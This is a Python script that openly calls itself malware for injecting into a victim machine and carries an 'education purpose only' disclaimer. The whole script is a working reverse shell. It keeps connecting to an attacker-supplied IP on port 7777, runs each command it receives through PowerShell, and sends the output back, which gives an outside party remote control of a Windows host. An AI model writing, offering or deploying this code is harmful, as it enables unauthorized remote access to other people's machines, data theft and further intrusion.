

#This is the Malware to be injected in the victim machine 
#This Malware is created for education purpose only. The developer/creator is not responsible for the acts with the script.

# Main libraries used are socket, subprocess, time, os 
import socket
import time
import os
import subprocess

IDENTIFIER = "<END_OF_RESULTS>"


if __name__ == "__main__":
    

    forward_IP = #Edit here (Enter the HackerIP)
    forward_port = 7777
    h_addr = (forward_IP, forward_port)
    
    while True:
        try:
            
            v_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                
            v_s.connect(h_addr)
            while True:    
                data = v_s.recv(1024)
                h_c = data.decode()
                if h_c == "stop":
                    break
                elif h_c == "":
                    continue
                elif h_c.startswith("cd"):
                    path2move = h_c.strip("cd ")
                    if os.path.exists(path2move):
                        os.chdir(path2move)
                    else:
                        print(" ")
                    continue
                else:
                    output = subprocess.run(["powershell.exe", h_c], shell=True, capture_output=True)
                    if output.stderr.decode("utf-8") == "":
                        result_to_forward = output.stdout
                        result_to_forward = result_to_forward.decode("utf-8") + IDENTIFIER
                        result_to_forward = result_to_forward.encode("utf-8")
                    else:
                        result_to_forward = output.stderr
                    
                    v_s.sendall(result_to_forward)
        except KeyboardInterrupt:
            print("exiting")
        except Exception as err:
            print("Unable to connect:", err)
            time.sleep(5)